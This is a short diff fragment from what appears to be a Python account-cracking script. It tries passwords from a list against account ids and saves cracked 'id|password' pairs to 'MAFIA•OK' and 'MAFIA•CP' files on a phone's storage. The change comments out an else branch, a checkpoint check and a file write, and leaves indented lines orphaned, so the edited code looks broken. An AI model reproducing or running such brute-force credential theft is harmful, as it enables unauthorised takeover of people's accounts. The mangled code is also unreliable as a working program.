@@ -397,7 +397,7 @@ def m2(ids,names,passlist):
                                         break
                                 else:
                                         break
-                       else:
+            #           else:
                                 continue
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
@@ -432,10 +432,10 @@ def m4(ids,names,passlist):
                                 open(f'/sdcard/MAFIA•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in MX:
+                   #     elif 'checkpoint' in MX:
                                 if 'y' in pcp:
                                         print(f'\r\r\x1b[38;5;208m [MAFIA•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/MAFIA•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                  #      open(f'/sdcard/MAFIA•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
